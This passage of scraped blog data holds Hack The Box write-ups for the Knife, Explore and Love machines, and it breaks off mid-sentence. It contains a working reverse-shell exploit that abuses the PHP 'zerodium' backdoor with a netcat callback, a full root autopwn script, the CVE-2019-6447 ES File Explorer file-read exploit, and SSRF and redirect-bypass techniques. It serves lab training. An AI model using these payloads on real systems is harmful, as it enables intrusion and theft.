requests.Session() def main():\tr = s.get(sys.argv[1], headers={\"User-Agentt\":\"zerodiumsystem(\\\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc 10.10.14.175 443 &gt;/tmp/f\\\");\"})if __name__ == \"__main__\":\tif(len(sys.argv)==2):\t\tmain()\telse:\t\tprint(\"Use: \" + sys.argv[0] + \" &lt;http://test&gt;\")Before running the exploit, we will be listening for the reverse shell with netcat in our machine:nc -nlvp 443After executing the exploit:Reverse ShellWe can see how we have got a shell as the james user. We will proceed to visualize the flag.txt in the /home/james directory.Root ShellEnumerationNow we have a shell as the james user, so we will start to enumerate the target machine in order to escalate privileges.The first thing we will do is to check sudo permissions for our current user james. To do this:Sudo PrivilegesWe can see how we have got the ability to execute the /usr/bin/knife binary as root and without providing the password.Knife BinaryWe will inspect this binary further in order to try to escalate our privileges to the root account.First, we will see the help panel from the binary:Knife BinaryWe can see how the help panel has 375 lines, meaning is huge. We will have to analyze this help panel patiently.The following command will attract our attention, as it seems we can execute a script:Knife Exec HelpThe only problem is that we don’t know what type of script we have to provide. We will explore the documentation of the utility:Knife DocsNow we know that the program is expecting a Ruby script, we will use the following script to spawn a shell:#!/usr/bin/ruby -wsystem(\"/bin/bash\")The last thing will be executing the Knife tool as sudo and specifying the path to the Ruby script that we have just created:whoami rootWe can see how we have a shell as the root user, so we will proceed to visualize the root.txt flag in the root directory.AutoPwnAs we have seen, the foothold and the privilege escalation of this machine have been very straightforward. That is why we have decided to do a script in Python that automates the whole process:#!/usr/bin/python3#coding: utf-8# Knife Machine Autopwn# Author: Gaizka Martin (a.k.a g2jz)import requestsimport sysimport threadingimport timefrom pwn import *# Variables globaleslport = 443# Sesion HTTPs = requests.Session()# Barras de progresop1 = log.progress(\"RCE\")p2 = log.progress(\"Reverse Shell\")# Ctrl Cdef handler(signal,frame):\tlog.failure(\"Saliendo...\")\tsys.exit(1)signal.signal(signal.SIGINT,handler)# Intrusiondef obtainShell():\ttry:\t\tp1.status(\"Enviando...\")\t\ttime.sleep(1)\t\t\t\t# Exploit\t\theader_data= {\t\t\t\"User-Agentt\":\"zerodiumsystem(\\\"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2&gt;&amp;1|nc %s %s &gt;/tmp/f\\\");\" % (sys.argv[2],lport)\t\t}\t\tr = s.get(sys.argv[1], headers=header_data)\t\tp1.success(\"Enviada\")\t\ttime.sleep(1)\texcept:\t\tlog.failure(\"Ha ocurrido un error!\")\t\tsys.exit(1)# Mainif __name__ == \"__main__\":\t# Comprobacion argv\tif(len(sys.argv)==3):\t\ttry:\t\t\tthreading.Thread(target = obtainShell).start()\t\texcept Exception as e:\t\t\tlog.error(str(e))\t\tp2.status(\"Esperando conexion...\")\t\t# Listener\t\tshell = listen(lport,timeout=20).wait_for_connection()\t\t# Connection checker\t\tif shell.sock is None:\t\t\tlog.failure(\"No se ha obtenido ninguna conexion!\")\t\t\tsys.exit(1)\t\telse:\t\t\tp2.success(\"Conexion obtenida\")\t\t\ttime.sleep(1)\t\t\t# Nos situamos en el directorio de trabajo\t\t\tshell.sendline(b'cd /tmp')\t\t\t\t\t\t# Escalada de privilegios\t\t\tpayload = b'''echo -e \"#\\!/usr/bin/ruby -w\\n\\nsystem('/bin/bash')\" &gt; k.rb'''\t\t\tshell.sendline(payload)\t\t\texecute_payload = b'sudo /usr/bin/knife exec k.rb'\t\t\tshell.sendline(execute_payload)\t\t\t# Interactive shell\t\t\tshell.interactive()\t\telse:\t\t# Usage\t\tprint(\"Usage: \" + sys.argv[0] + \" &lt;http://RHOST&gt;\" + \" &lt;LHOST&gt;\")Autopwn WorkingWe can see how running the script, indicating the RHOST and the LHOST, we obtain a shell as the root user." }, { "title": "Explore Write-up", "url": "/posts/explore/", "categories": "Hack The Box, Android", "tags": "htb, android, cve, adb", "date": "2022-09-29 09:00:00 +0200", "snippet": "EnumerationNmapThe first thing we will do is enumerate the open ports on the target machine. To do this, we are going to be using nmap. The type of scan that we are going to use scans all the range of ports, filters the open ones, and uses the TCP Syn Port Scan method. We also disabled host discovery and DNS resolution to make the scan faster. The last thing is to export evidence to a file called allPorts:nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.10.247# Nmap 7.91 scan initiated Thu Aug 5 18:35:51 2021 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.10.247# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10.10.10.247 ()\tStatus: UpHost: 10.10.10.247 ()\tPorts: 2222/open/tcp//EtherNetIP-1///, 42135/open/tcp/////, 44729/open/tcp/////, 59777/open/tcp/////# Nmap done at Thu Aug 5 18:36:04 2021 -- 1 IP address (1 host up) scanned in 13.50 secondsOnce we know the open ports on the machine, we can do a more exhaustive scan to detect the services that are running and their versions. We will export the results to the targeted file:nmap -sC -sV -p2222,42135,44729,59777 -oN targeted 10.10.10.247# Nmap 7.91 scan initiated Thu Aug 5 18:36:38 2021 as: nmap -sC -sV -p2222,42135,44729,59777 -oN targeted 10.10.10.247Nmap scan report for 10.10.10.247Host is up (0.050s latency).PORT STATE SERVICE VERSION2222/tcp open ssh (protocol 2.0)| fingerprint-strings: | NULL: |_ SSH-2.0-SSH Server - Banana Studio| ssh-hostkey: |_ 2048 71:90:e3:a7:c9:5d:83:66:34:88:3d:eb:b4:c7:88:fb (RSA)42135/tcp open http ES File Explorer Name Response httpd|_http-title: Site doesn't have a title (text/html).44729/tcp open unknown| fingerprint-strings: | GenericLines: | HTTP/1.0 400 Bad Request| Date: Thu, 05 Aug 2021 16:49:58 GMT| Content-Length: 22| Content-Type: text/plain; charset=US-ASCII| Connection: Close| Invalid request line:| GetRequest: | HTTP/1.1 412 Precondition Failed| Date: Thu, 05 Aug 2021 16:49:58 GMT| Content-Length: 0| HTTPOptions: | HTTP/1.0 501 Not Implemented| Date: Thu, 05 Aug 2021 16:50:03 GMT| Content-Length: 29| Content-Type: text/plain; charset=US-ASCII| Connection: Close| Method not supported: OPTIONS| Help: | HTTP/1.0 400 Bad Request| Date: Thu, 05 Aug 2021 16:50:19 GMT| Content-Length: 26| Content-Type: text/plain; charset=US-ASCII| Connection: Close| Invalid request line: HELP| RTSPRequest: | HTTP/1.0 400 Bad Request| Date: Thu, 05 Aug 2021 16:50:03 GMT| Content-Length: 39| Content-Type: text/plain; charset=US-ASCII| Connection: Close| valid protocol version: RTSP/1.0| SSLSessionReq: | HTTP/1.0 400 Bad Request| Date: Thu, 05 Aug 2021 16:50:19 GMT| Content-Length: 73| Content-Type: text/plain; charset=US-ASCII| Connection: Close| Invalid request line: | ?G???,???`~?| ??{????w????&lt;=?o?| TLSSessionReq: | HTTP/1.0 400 Bad Request| Date: Thu, 05 Aug 2021 16:50:19 GMT| Content-Length: 71| Content-Type: text/plain; charset=US-ASCII| Connection: Close| Invalid request line: | ??random1random2random3random4| TerminalServerCookie: | HTTP/1.0 400 Bad Request| Date: Thu, 05 Aug 2021 16:50:19 GMT| Content-Length: 54| Content-Type: text/plain; charset=US-ASCII| Connection: Close| Invalid request line: |_ Cookie: mstshash=nmap59777/tcp open http Bukkit JSONAPI httpd for Minecraft game server 3.6.0 or older|_http-title: Site doesn't have a title (text/plain).2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============SF-Port2222-TCP:V=7.91%I=7%D=8/5%Time=610C139D%P=x86_64-pc-linux-gnu%r(NULSF:L,24,\"SSH-2\\.0-SSH\\x20Server\\x20-\\x20Banana\\x20Studio\\r\\n\");==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============SF-Port44729-TCP:V=7.91%I=7%D=8/5%Time=610C139C%P=x86_64-pc-linux-gnu%r(GeSF:nericLines,AA,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Thu,\\x200SF:5\\x20Aug\\x202021\\x2016:49:58\\x20GMT\\r\\nContent-Length:\\x2022\\r\\nContentSF:-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\rSF:\\nInvalid\\x20request\\x20line:\\x20\")%r(GetRequest,5C,\"HTTP/1\\.1\\x20412\\xSF:20Precondition\\x20Failed\\r\\nDate:\\x20Thu,\\x2005\\x20Aug\\x202021\\x2016:49SF::58\\x20GMT\\r\\nContent-Length:\\x200\\r\\n\\r\\n\")%r(HTTPOptions,B5,\"HTTP/1\\.SF:0\\x20501\\x20Not\\x20Implemented\\r\\nDate:\\x20Thu,\\x2005\\x20Aug\\x202021\\x2SF:016:50:03\\x20GMT\\r\\nContent-Length:\\x2029\\r\\nContent-Type:\\x20text/plaiSF:n;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\r\\nMethod\\x20not\\x20SF:supported:\\x20OPTIONS\")%r(RTSPRequest,BB,\"HTTP/1\\.0\\x20400\\x20Bad\\x20ReSF:quest\\r\\nDate:\\x20Thu,\\x2005\\x20Aug\\x202021\\x2016:50:03\\x20GMT\\r\\nConteSF:nt-Length:\\x2039\\r\\nContent-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\SF:nConnection:\\x20Close\\r\\n\\r\\nNot\\x20a\\x20valid\\x20protocol\\x20version:\\SF:x20\\x20RTSP/1\\.0\")%r(Help,AE,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDatSF:e:\\x20Thu,\\x2005\\x20Aug\\x202021\\x2016:50:19\\x20GMT\\r\\nContent-Length:\\xSF:2026\\r\\nContent-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnection:SF:\\x20Close\\r\\n\\r\\nInvalid\\x20request\\x20line:\\x20HELP\")%r(SSLSessionReq,SF:DD,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Thu,\\x2005\\x20Aug\\x2SF:02021\\x2016:50:19\\x20GMT\\r\\nContent-Length:\\x2073\\r\\nContent-Type:\\x20tSF:ext/plain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\r\\nInvalid\\xSF:20request\\x20line:\\x20\\x16\\x03\\0\\0S\\x01\\0\\0O\\x03\\0\\?G\\?\\?\\?,\\?\\?\\?`~\\?\\SF:0\\?\\?{\\?\\?\\?\\?w\\?\\?\\?\\?&lt;=\\?o\\?\\x10n\\0\\0\\(\\0\\x16\\0\\x13\\0\")%r(TerminalSerSF:verCookie,CA,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDate:\\x20Thu,\\x2005SF:\\x20Aug\\x202021\\x2016:50:19\\x20GMT\\r\\nContent-Length:\\x2054\\r\\nContent-SF:Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnection:\\x20Close\\r\\n\\r\\SF:nInvalid\\x20request\\x20line:\\x20\\x03\\0\\0\\*%\\?\\0\\0\\0\\0\\0Cookie:\\x20mstshSF:ash=nmap\")%r(TLSSessionReq,DB,\"HTTP/1\\.0\\x20400\\x20Bad\\x20Request\\r\\nDaSF:te:\\x20Thu,\\x2005\\x20Aug\\x202021\\x2016:50:19\\x20GMT\\r\\nContent-Length:\\SF:x2071\\r\\nContent-Type:\\x20text/plain;\\x20charset=US-ASCII\\r\\nConnectionSF::\\x20Close\\r\\n\\r\\nInvalid\\x20request\\x20line:\\x20\\x16\\x03\\0\\0i\\x01\\0\\0eSF:\\x03\\x03U\\x1c\\?\\?random1random2random3random4\\0\\0\\x0c\\0/\\0\");Service Info: Device: phoneService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Thu Aug 5 18:38:20 2021 -- 1 IP address (1 host up) scanned in 102.39 secondsWe can see how ports 2222 (SSH), 42135 (ES File Explorer HTTP), 44729 (not identified) and 59777 (HTTP) are open.We will start our enumeration with the 42135 and 59777 ports as they are both HTTP services and it is always a good point to start.Web Server On Port 42135If we access this port from the browser, we can see the following:Not found on port 42135It won’t give us much information, but we know that there is an HTTP server on that port, and we will keep this in mind.Web Server On Port 59777If we try to access the HTTP server on port 59777, we will see the following:Forbidden on port 59777Like the web server on port 42135, it does not give us much information, so we will continue exploring further.ES File ExplorerIf we remember the initial enumeration phase, Nmap identified port 42135 as the ES File Explorer application. This application is a very popular file explorer for Android, so we will search for any known vulnerabilities in the program. To do this, we will use SearchSploit:searchsploitWe can see how we have an arbitrary file read vulnerability in the 4.1.9.7.4 version of ES File Explorer. So we will download the exploit and start to examine how it works:# Exploit Title: ES File Explorer 4.1.9.7.4 - Arbitrary File Read# Date: 29/06/2021# Exploit Author: Nehal Zaman# Version: ES File Explorer v4.1.9.7.4# Tested on: Android# CVE : CVE-2019-6447import requestsimport jsonimport astimport sysif len(sys.argv) &lt; 3: \tprint(f \"USAGE {sys.argv[0]} &lt;command&gt; &lt;IP&gt; [file to download]\") \tsys.exit(1) url = 'http://' + sys.argv[2] + ':59777'cmd = sys.argv[1] cmds = ['listFiles', 'listPics', 'listVideos', 'listAudios', 'listApps', 'listAppsSystem', 'listAppsPhone', 'listAppsSdcard', 'listAppsAll', 'getFile', 'getDeviceInfo'] listCmds = cmds[: 9]if cmd not in cmds: \tprint(\"[-] WRONG COMMAND!\") print(\"Available commands : \") \tprint(\" listFiles : List all Files.\") \tprint(\" listPics : List all Pictures.\") \tprint(\" listVideos : List all videos.\") \tprint(\" listAudios : List all audios.\") \tprint(\" listApps : List Applications installed.\") \tprint(\" listAppsSystem : List System apps.\") \tprint(\" listAppsPhone : List Communication related apps.\") \tprint(\" listAppsSdcard : List apps on the SDCard.\") \tprint(\" listAppsAll : List all Application.\") \tprint(\" getFile : Download a file.\") \tprint(\" getDeviceInfo : Get device info.\") \tsys.exit(1) print(\"\\n==================================================================\") print(\"| ES File Explorer Open Port Vulnerability : CVE-2019-6447 |\") print(\"| Coded By : Nehal a.k.a PwnerSec |\") print(\"==================================================================\\n\") header = { \"Content-Type\": \"application/json\" }proxy = { \"http\": \"http://127.0.0.1:8080\", \"https\": \"https://127.0.0.1:8080\" }def httpPost(cmd): \tdata = json.dumps({ \t\"command\": cmd\t}) \tresponse = requests.post(url, headers = header, data = data) \treturn ast.literal_eval(response.text) def parse(text, keys): \tfor dic in text: \t\tfor key in keys: \t\t\tprint(f \"{key} : {dic[key]}\") \t\tprint('') \t\tdef do_listing(cmd): \tresponse = httpPost(cmd) \tif len(response) == 0: \t\tkeys = []\telse:\t\tkeys = list(response[0].keys()) \t\tparse(response, keys) \t\tif cmd in listCmds: \tdo_listing(cmd) \t\telif cmd == cmds[9]: \tif len(sys.argv) != 4: \t\tprint(\"[+] Include file name to download.\") \t\tsys.exit(1) \telif sys.argv[3][0] != '/': \t\tprint(\"[-] You need to provide full path of the file.\") \t\tsys.exit(1)\telse :\t\tpath = sys.argv[3] \t\tprint(\"[+] Downloading file...\") \t\tresponse = requests.get(url + path) \t\twith open('out.dat', 'wb') as wf: \t\t\twf.write(response.content) \t\tprint(\"[+] Done. Saved as `out.dat`.\") elif cmd == cmds[10]: \tresponse = httpPost(cmd) \tkeys = list(response.keys()) \tfor key in keys: \t\tprint(f \"{key} : {response[key]}\")We can see how this vulnerability exploits a web server that ES File Explorer creates on port 59777 when started. If we examine the code further, we can see the following help panel that indicates the available commands for the exploit:Exploit help panelFirst, we will start enumerating potential files that the target machine contains. We will start with the pictures:List picturesWe can see a file that is called creds.jpg that will attract our attention. We will try to download this image in order to inspect it. With the getFile command of the exploit, we can indicate the path of the file that we want to download:Download fileWe can see how the script downloads the file with the name out.dat, so we will change it to the original creds.jpg name and we will visualize the picture:CredentialsWe can see the following credentials in the image:kristi:Kr1sT!5h@Rp3xPl0r3!User ShellSSHIf we remember the enumeration phase, we had the 2222 port open and an SSH server was running on it. We will try to connect with the credentials that we have just discovered:sshWe can see how we got a shell as the u0_a76 user, so we will proceed and see the user.txt flag in the /sdcard directory.Root ShellEnumerationAt this point, having a shell as the u0_a76 user, we will try to escalate privileges and convert to the root user. To do this, we will start by listing all the network connections that are running on the target machine:netstat -anetstatWe can see how the majority of the ports are exposed and are the same ports that we have seen in the enumeration phase, but there is one port that we have not seen. This port is the 5555 port.If we research a little bit more about this port, we will notice that in Android, this port usually runs adb over WiFi. This comes in very handy as adb allows us to convert to the root user.The only problem is that this port is not exposed and we can not access it from the outside. Since we have access to the SSH server, we can use the -L flag to forward this port to our machine. To do this, we will use the following command:ssh -L 5555:127.0.0.1:5555 kristi@10.10.10.247 -p 2222Once we have the port forwarded, we can check on our machine if any service is running on port 5555:lsofWe can see how port 5555 is being used by SSH (as expected). This means that the port 5555 of our machine corresponds to the 5555 port on the target machine, so we will have a connection with it.ADBAt this point, we will try to connect via adb to the target machine. To do this, we will connect to the 5555 port on our machine (remember that this port corresponds to the 5555 port on the target machine), initialize adb as the root user, and list the connected devices:adbWe can see how we are connected to the target machine via adb as the root user.To have full control of the target machine, we will spawn an interactive shell. To do this:root ShellWe can see how we have a shell as the root user, so we will proceed to visualize the root.txt flag in the /data directory." }, { "title": "Love Write-up", "url": "/posts/love/", "categories": "Hack The Box, Windows", "tags": "htb, windows, ssrf, msi", "date": "2022-09-28 09:00:00 +0200", "snippet": "EnumerationNmapAs always, we will start by enumerating the ports on the target machine. To do this, we will use our beloved nmap. The scan that we will be using scans all the port range, displays only the open ports and uses the TCP Syn Port Scan method. Additionally, DNS resolution and host discovery are disabled to speed up the scan. All evidence is stored in the allPorts file.nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.10.239# Nmap 7.91 scan initiated Mon Jul 26 23:54:07 2021 as: nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -oG allPorts 10.10.10.239# Ports scanned: TCP(65535;1-65535) UDP(0;) SCTP(0;) PROTOCOLS(0;)Host: 10.10.10.239 ()\tStatus: UpHost: 10.10.10.239 ()\tPorts: 80/open/tcp//http///, 135/open/tcp//msrpc///, 139/open/tcp//netbios-ssn///, 443/open/tcp//https///, 445/open/tcp//microsoft-ds///, 3306/open/tcp//mysql///, 5000/open/tcp//upnp///, 5040/open/tcp//unknown///, 5985/open/tcp//wsman///, 5986/open/tcp//wsmans///, 7680/open/tcp//pando-pub///, 47001/open/tcp//winrm///, 49664/open/tcp/////, 49665/open/tcp/////, 49666/open/tcp/////, 49667/open/tcp/////, 49668/open/tcp/////, 49669/open/tcp/////, 49670/open/tcp/////# Nmap done at Mon Jul 26 23:54:23 2021 -- 1 IP address (1 host up) scanned in 16.19 secondsOnce we have the open ports, we will perform a more exhaustive exam. This scan will let us know what services and versions of them are running on the ports that we have just discovered are open. To do that, we will use the following command:nmap -sC -sV -p80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,49667,49668,49669,49670 -oN targeted 10.10.10.239# Nmap 7.91 scan initiated Mon Jul 26 23:55:04 2021 as: nmap -sC -sV -p80,135,139,443,445,3306,5000,5040,5985,5986,7680,47001,49664,49665,49666,49667,49668,49669,49670 -oN targeted 10.10.10.239Nmap scan report for 10.10.10.239Host is up (0.045s latency).PORT STATE SERVICE VERSION80/tcp open http Apache httpd 2.4.46 ((Win64) OpenSSL/1.1.1j PHP/7.3.27)| http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27|_http-title: Voting System using PHP135/tcp open msrpc Microsoft Windows RPC139/tcp open netbios-ssn Microsoft Windows netbios-ssn443/tcp open ssl/http Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27|_http-title: 403 Forbidden| ssl-cert: Subject: commonName=staging.love.htb/organizationName=ValentineCorp/stateOrProvinceName=m/countryName=in| Not valid before: 2021-01-18T14:00:16|_Not valid after: 2022-01-18T14:00:16|_ssl-date: TLS randomness does not represent time| tls-alpn: |_ http/1.1445/tcp open microsoft-ds Windows 10 Pro 19042 microsoft-ds (workgroup: WORKGROUP)3306/tcp open mysql?| fingerprint-strings: | FourOhFourRequest, Kerberos: |_ Host '10.10.14.248' is not allowed to connect to this MariaDB server5000/tcp open http Apache httpd 2.4.46 (OpenSSL/1.1.1j PHP/7.3.27)|_http-server-header: Apache/2.4.46 (Win64) OpenSSL/1.1.1j PHP/7.3.27|_http-title: 403 Forbidden5040/tcp open unknown5985/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found5986/tcp open ssl/http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found| ssl-cert: Subject: commonName=LOVE| Subject Alternative Name: DNS:LOVE, DNS:Love| Not valid before: 2021-04-11T14:39:19|_Not valid after: 2024-04-10T14:39:19|_ssl-date: 2021-07-26T22:32:35+00:00; +34m34s from scanner time.| tls-alpn: |_ http/1.17680/tcp open pando-pub?47001/tcp open http Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)|_http-server-header: Microsoft-HTTPAPI/2.0|_http-title: Not Found49664/tcp open msrpc Microsoft Windows RPC49665/tcp open msrpc Microsoft Windows RPC49666/tcp open msrpc Microsoft Windows RPC49667/tcp open msrpc Microsoft Windows RPC49668/tcp open msrpc Microsoft Windows RPC49669/tcp open msrpc Microsoft Windows RPC49670/tcp open msrpc Microsoft Windows RPC1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :SF-Port3306-TCP:V=7.91%I=7%D=7/26%Time=60FF2F47%P=x86_64-pc-linux-gnu%r(KeSF:rberos,4B,\"G\\0\\0\\x01\\xffj\\x04Host\\x20'10\\.10\\.14\\.248'\\x20is\\x20not\\x20SF:allowed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\")%r(FourOhFSF:ourRequest,4B,\"G\\0\\0\\x01\\xffj\\x04Host\\x20'10\\.10\\.14\\.248'\\x20is\\x20notSF:\\x20allowed\\x20to\\x20connect\\x20to\\x20this\\x20MariaDB\\x20server\");Service Info: Hosts: www.example.com, LOVE, www.love.htb; OS: Windows; CPE: cpe:/o:microsoft:windowsHost script results:|_clock-skew: mean: 2h19m34s, deviation: 3h30m01s, median: 34m33s| smb-os-discovery: | OS: Windows 10 Pro 19042 (Windows 10 Pro 6.3)| OS CPE: cpe:/o:microsoft:windows_10::-| Computer name: Love| NetBIOS computer name: LOVE\\x00| Workgroup: WORKGROUP\\x00|_ System time: 2021-07-26T15:32:20-07:00| smb-security-mode: | account_used: &lt;blank&gt;| authentication_level: user| challenge_response: supported|_ message_signing: disabled (dangerous, but default)| smb2-security-mode: | 2.02: |_ Message signing enabled but not required| smb2-time: | date: 2021-07-26T22:32:21|_ start_date: N/AService detection performed. Please report any incorrect results at https://nmap.org/submit/ .# Nmap done at Mon Jul 26 23:58:02 2021 -- 1 IP address (1 host up) scanned in 177.83 secondsWe can see that the number of ports that are open is huge. We will explore them in order so we don’t get lost.Web ServerFirst, we will start enumerating the web server that is running on port 80. We open the browser and type in our target machine’s IP address. We will see the following:Login PageWe are in front of a login page. If we look at the URL, we can see that the login page is in the index.php file. This indicates that the web page is built in PHP, so we will keep this in mind.After trying some default credentials (admin:admin, user:password, administrator:password) we can not authenticate against the server, so we will continue exploring.To explorer further, we will fuzz the web server in order to find hidden directories. We will use wfuzz and the Dirbuster's directory-list-2.3-medium.txt wordlist:wfuzz -c --hc=404 -f fuzzRoot,raw -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.239/FUZZTarget: http://10.10.10.239/FUZZTotal requests: 220560==================================================================ID Response Lines Word Chars Request ==================================================================00001: C=200 125 L\t 324 W\t 4388 Ch\t \"# directory-list-2.3-medium.txt\"00006: C=200 125 L\t 324 W\t 4388 Ch\t \"# Attribution-Share Alike 3.0 License. To view a copy of this\"00009: C=200 125 L\t 324 W\t 4388 Ch\t \"# Suite 300, San Francisco, California, 94105, USA.\"00013: C=200 125 L\t 324 W\t 4388 Ch\t \"#\"00007: C=200 125 L\t 324 W\t 4388 Ch\t \"# license, visit http://creativecommons.org/licenses/by-sa/3.0/\"00004: C=200 125 L\t 324 W\t 4388 Ch\t \"#\"00002: C=200 125 L\t 324 W\t 4388 Ch\t \"#\"00003: C=200 125 L\t 324 W\t 4388 Ch\t \"# Copyright 2007 James Fisher\"00005: C=200 125 L\t 324 W\t 4388 Ch\t \"# This work is licensed under the Creative Commons\"00012: C=200 125 L\t 324 W\t 4388 Ch\t \"# on at least 2 different hosts\"00010: C=200 125 L\t 324 W\t 4388 Ch\t \"#\"00011: C=200 125 L\t 324 W\t 4388 Ch\t \"# Priority ordered case sensitive list, where entries were found\"00016: C=301 9 L\t 30 W\t 338 Ch\t \"images\"00014: C=200 125 L\t 324 W\t 4388 Ch\t \"http://10.10.10.239/\"00008: C=200 125 L\t 324 W\t 4388 Ch\t \"# or send a letter to Creative Commons, 171 Second Street,\"00203: C=301 9 L\t 30 W\t 338 Ch\t \"Images\"00259: C=301 9 L\t 30 W\t 337 Ch\t \"admin\"00519: C=301 9 L\t 30 W\t 339 Ch\t \"plugins\"00638: C=301 9 L\t 30 W\t 340 Ch\t \"includes\"00902: C=503 11 L\t 44 W\t 402 Ch\t \"examples\"Total time: 0Processed Requests: 1139Filtered Requests: 1119Requests/sec.: 0We can see that some interesting directories are found: admin, images and plugins. We will have this in mind and we will continue fuzzing the admin directory, as it seems the most intriguing one. We will this time fuzz for files with PHP extension inside of the admin folder:wfuzz -c --hc=404 -f fuzzAdminPHP,raw -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt http://10.10.10.239/admin/FUZZ.phpTarget: http://10.10.10.239/admin/FUZZ.phpTotal requests: 220560==================================================================ID Response Lines Word Chars Request ==================================================================00001: C=200 169 L\t 450 W\t 6198 Ch\t \"# directory-list-2.3-medium.txt\"00005: C=200 169 L\t 450 W\t 6198 Ch\t \"# This work is licensed under the Creative Commons\"00009: C=200 169 L\t 450 W\t 6198 Ch\t \"# Suite 300, San Francisco, California, 94105, USA.\"00004: C=200 169 L\t 450 W\t 6198 Ch\t \"#\"00007: C=200 169 L\t 450 W\t 6198 Ch\t \"# license, visit http://creativecommons.org/licenses/by-sa/3.0/\"00006: C=200 169 L\t 450 W\t 6198 Ch\t \"# Attribution-Share Alike 3.0 License. To view a copy of this\"00002: C=200 169 L\t 450 W\t 6198 Ch\t \"#\"00003: C=200 169 L\t 450 W\t 6198 Ch\t \"# Copyright 2007 James Fisher\"00008: C=200 169 L\t 450 W\t 6198 Ch\t \"# or send a letter to Creative Commons, 171 Second Street,\"00010: C=200 169 L\t 450 W\t 6198 Ch\t \"#\"00011: C=200 169 L\t 450 W\t 6198 Ch\t \"# Priority ordered case sensitive list, where entries were found\"00015: C=200 169 L\t 450 W\t 6198 Ch\t \"index\"00013: C=200 169 L\t 450 W\t 6198 Ch\t \"#\"00012: C=200 169 L\t 450 W\t 6198 Ch\t \"# on at least 2 different hosts\"00038: C=302 412 L\t 1114 W\t 16257 Ch\t \"home\"00053: C=302 0 L\t 0 W\t 0 Ch\t \"login\"00142: C=302 4 L\t 47 W\t 397 Ch\t \"print\"00286: C=302 412 L\t 1114 W\t 16257 Ch\t \"Home\"00659: C=200 169 L\t 450 W\t 6198 Ch\t \"Index\"00825: C=302 0 L\t 0 W\t 0 Ch\t \"Login\"01225: C=302 0 L\t 0 W\t 0 Ch\t \"logout\"05085: C=200 169 L\t 450 W\t 6198 Ch\t \"INDEX\"05192: C=302 490 L\t 1277 W\t 19800 Ch\t \"positions\"05955: C=302 4 L\t 47 W\t 397 Ch\t \"Print\"Total time: 0Processed Requests: 6975Filtered Requests: 6951Requests/sec.: 0We can see a bunch of files. If we look at the status codes of the found pages, we can see that all of them have 302 status code, except the index.php, which has a 200 status code. If we try to navigate to any of the files with 302 status code, we will notice that we are being redirected to the index.php page.Intended path: Web server on port 443 and SSRF (Server-Side Request Forgery)Remembering the enumeration phase of the target machine, we know that there is another web server running on port 443. The downside of this server is that we can’t access it:Web Server in Port 443If we examine the website further, we can see the following in the certificate that is being used:HTTPS CertificateWe can see that a domain is being leaked in the SSL certificate. This domain is staging.love.htb and we will add it to our /etc/hosts file, as we guess the target machine could be using some sort of Virtual Hosting (host multiple domain names on a single machine). If we access this resource in our browser, we will see the following:staging.love.htbIf we go to the demo tab:Demo tabWe can see that this service asks for a URL, that later is analyzed to find Malware in it.We are in front of a service that is asking us for a URL. We will try to point this URL to the internal resources of the machine, hoping we can find useful information. To do this, we will point it to the 127.0.0.1 IP address, which corresponds to localhost or, in other words, to the machine that is running the web server. If we achieve listing internal resources from the target machine, we will be facing an SSRF (Server-Side Request Forgery) vulnerability.If we remember the enumeration phase, we had another web server running on port 5000. This web server, like the one on port 443, is unreachable. We will try to access it from the staging.love.htb demo tab:SSRFWe can see that the following credentials for the admin user are being displayed:admin:@LoveIsInTheAir!!!!If we try these credentials on the login page of the web server on port 80, we can see that they are correct.Unintended path: Web server on port 80 (302 to 200)In the fuzzing phase, the status code for most of the resources in the admin directory, was 302. Having in mind some recently read Bug Bounty articles, we can try to bypass this 302 status code. First, we will open Burpsuite proxy to analyze further the responses and requests that are being exchanged between the web server and us.The first resource that we will try to access is going to be admin/home.php, as it seems to be the principal page after being logged in. We will intercept this request with Burpsuite and we will indicate that we also want the response to be intercepted:Burpsuite InterceptWe can see, how the response has a 302 Found status code and also how the source code of the home.php page is being displayed:home.php ResponseWe will try to change this 302 Found to 200 OK in the response and see what happens:home.phpThis works, and we can see how in the 